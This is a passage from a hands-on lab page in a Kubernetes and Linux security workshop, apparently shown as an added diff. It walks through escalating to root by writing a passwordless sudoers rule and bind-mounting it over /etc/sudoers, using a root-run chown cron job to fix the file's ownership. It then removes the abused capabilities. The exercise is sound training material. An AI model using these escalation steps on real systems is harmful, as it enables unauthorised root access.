+<span class="n">libc</span><span class="p">.</span><span class="n">mount</span><span class="p">(</span><span class="n">source</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">filesystemtype</span><span class="p">,</span> <span class="n">mountflags</span><span class="p">,</span> <span class="n">options</span><span class="p">)</span>
+
+<span class="n">END</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Set the <code>mount.py</code> program executable:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod </span>755 mount.py
+</code></pre></div></div>
+</li>
+<li>
+<p>Run the <code>mount.py</code> program with the <code>-h</code> argument to see the help:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./mount.py <span class="nt">-h</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>We will use this program to mount our own <code>sudoers</code> file on top of the existing one. Construct a simple <code>sudoers</code> file that allows the <code>cypher</code> user to run any command as root, without needing to type a password:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"cypher ALL=(ALL) NOPASSWD: ALL"</span> <span class="o">&gt;</span>sudoers
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, use our <code>mount.py</code> program to mount this <code>sudoers</code> file onto <code>/etc/sudoers</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./mount.py <span class="nt">-s</span> ./sudoers <span class="nt">-t</span> /etc/sudoers <span class="nt">-f</span> none
+</code></pre></div></div>
+</li>
+<li>
+<p>Now try using the <code>sudo</code> command to <code>sudo su -</code> to become root - this will fail, but pay attention to the reason given:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su -
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that the output says the problem is that our replacement <code>sudoers</code> file is owned by uid <code>1001</code>, but needs to be owned by uid <code>0</code>. We need to find some way of getting this file to be owned by user ID (uid) <code>0</code>, or we need to pick a different file to mount. There are likely a number of ways for us to use our mounting privileges to get to root, but let's keep pursuing this one.</p>
+</li>
+<li>
+<p>Let's look for any unusual cron job files. First, look in <code>/etc/cron.d/</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> /etc/cron.d
+</code></pre></div></div>
+</li>
+<li>
+<p>Review the <code>fix-ownership-on-crew</code> cron job file, like so:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/cron.d/fix-ownership-on-crew
+</code></pre></div></div>
+</li>
+<li>
+<p>This cron entry runs <code>chown -R root /crew</code> every minute, setting the owner of any file in the <code>/crew</code> directory to <code>root</code>. Check to see if we can write to this directory with our current user:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-ld</span> /crew
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that the directory is writable by the <code>humans</code> group.</p>
+</li>
+<li>
+<p>Run an <code>id</code> command to determine if our current <code>cypher</code> user is in this group:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">id</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that <code>cypher</code> is in the <code>humans</code> group.</p>
+</li>
+<li>
+<p>Write a new <code>sudoers</code> file in the <code>/crew</code> directory:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"cypher ALL=(ALL) NOPASSWD: ALL"</span> <span class="o">&gt;</span>/crew/sudoers
+</code></pre></div></div>
+</li>
+<li>
+<p>Wait one minute for the cron job to change the owner of the <code>/crew/sudoers</code> file to root. To make this predictable, run a sleep command:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sleep </span>60
+</code></pre></div></div>
+</li>
+<li>
+<p>Confirm that the file is owned by <code>root</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-l</span> /crew/sudoers
+</code></pre></div></div>
+</li>
+<li>
+<p>Mount the <code>/crew/sudoers</code> file onto <code>/etc/sudoers</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./mount.py <span class="nt">-s</span> /crew/sudoers <span class="nt">-t</span> /etc/sudoers <span class="nt">-f</span> none
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, try <code>sudo su -</code> again:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su -
+</code></pre></div></div>
+</li>
+<li>
+<p>List the <code>root</code> home directory:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Read the <code>FLAG.txt</code> file! You win!</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>FLAG.txt
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's fix the escalation path we came in on. First, remove <code>CAP_SYS_ADMIN</code> from the python binary:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>setcap <span class="nt">-r</span> /usr/bin/python3-9
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's observe that the <code>CAP_NET_ADMIN</code> capability lets ordinary users modify the firewall - <code>iptables</code> was a multi-step symbolic link to <code>/usr/sbin/xtables-nft-multi</code>. This program didn't need to be Set-UID to let non-root users modify the firewall, so long as it had the <code>CAP_NET_ADMIN</code> capability. Just to be sure, let's remove Set-UID from the other related program, <code>/usr/sbin/xtables-legacy-multi</code>.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod </span>u-s /usr/sbin/xtables-legacy-multi
+</code></pre></div></div>
+</li>
+<li>
+<p>Next, switch to the <code>cypher</code> user:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su - cypher
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, add another firewall rule:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/sbin/iptables <span class="nt">-t</span> nat <span class="nt">-I</span> PREROUTING <span class="se">\</span>
+<span class="nt">-p</span> tcp <span class="nt">--dport</span> 82 <span class="nt">-j</span> REDIRECT <span class="nt">--to</span> 9999
+</code></pre></div></div>
+</li>
+<li>
+<p>Observe the firewall rule is in place, proving to yourself that Set-UID wasn't what was letting us modify firewall rules:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/sbin/iptables <span class="nt">-t</span> nat <span class="nt">-L</span> PREROUTING
+</code></pre></div></div>
+</li>
+<li>
+<p>Switch back to the <code>root</code> user:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exit</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Remove the <code>CAP_NET_ADMIN</code> capability from <code>/usr/sbin/xtables-nft-multi</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>setcap <span class="nt">-r</span> /usr/sbin/xtables-nft-multi
+</code></pre></div></div>
+</li>
+<li>
+<p>Switch to the <code>cypher</code> user again:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su - cypher
+</code></pre></div></div>
+</li>
+<li>
+<p>Try listing the firewall rules - this will produce an error message:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/sbin/iptables <span class="nt">-L</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that we're not able to list the firewall rules anymore, since our binary doesn't have the <code>CAP_NET_ADMIN</code> capability. Here is the output on our test system:</p>
+<pre><code>iptables v1.8.7 (nf_tables): Could not fetch rule set generation id: Permission denied (you must be root)
+</code></pre></li>
+<li>
+<p>Read the capabilities man page's section on the <code>CAP_NET_ADMIN</code> capability to understand why this capability is what allows the root user to manage the firewall.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>man capabilities
+</code></pre></div></div>
+</li>
+<li>
+<p>Here's the relevant section of that man page from our test system:</p>
+<pre><code>        CAP_NET_ADMIN
+       Perform various network-related operations:
+       * interface configuration;
+       * administration of IP firewall, masquerading, and accounting;
+       * modify routing tables;
+       * bind to any address for transparent proxying;
+       * set type-of-service (TOS);
+       * clear driver statistics;
+       * set promiscuous mode;
+       * enabling multicasting;
+       * use  setsockopt(2)  to  set  the following socket options: SO_DEBUG, SO_MARK, SO_PRIORITY
+         (for a priority outside the range 0 to 6), SO_RCVBUFFORCE, and SO_SNDBUFFORCE.
+</code></pre></li>
+<li>
+<p>This exercise is done. Close the terminal windows or tabs you used for this exercise.  Quit <code>dirbuster</code> if you haven't already.</p>
+</li>
+</ol>
+
+  </div>
+
+  <div class="post-exercise">
+    <h2 id="exercise-done">Done With the Exercise</h2>
+
+<p>Please flip your sticker over so we know how many people are done with the exercise.</p>
+</p>
+    
+
+
+    <h2 id="suspend-vms">Virtual Machine Management Tips</h2>
+
+<p> If you want to see what virtual machines are currently running, you can run:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  virsh list  
+</code></pre></div>    </div>
+    
+<p>If you have virtual machines using RAM and CPU, you can suspend all of them with:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  sudo /sync/bin/suspend-all-vms.sh 
+</code></pre></div>    </div>
+
+    
+
+  </div>
+
+</article>
+<script src="/assets/scripts/clipboard.min.js"></script>
+<script src="/assets/scripts/copy.js"></script>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Abusing and Protecting Kubernetes, Linux and Containers</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Abusing and Protecting Kubernetes, Linux and Containers</li><li><a class="u-email" href="mailto:contact@inguardians.com">contact@inguardians.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/inguardians"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">inguardians</span></a></li><li><a href="https://www.twitter.com/inguardians"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">inguardians</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p></p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
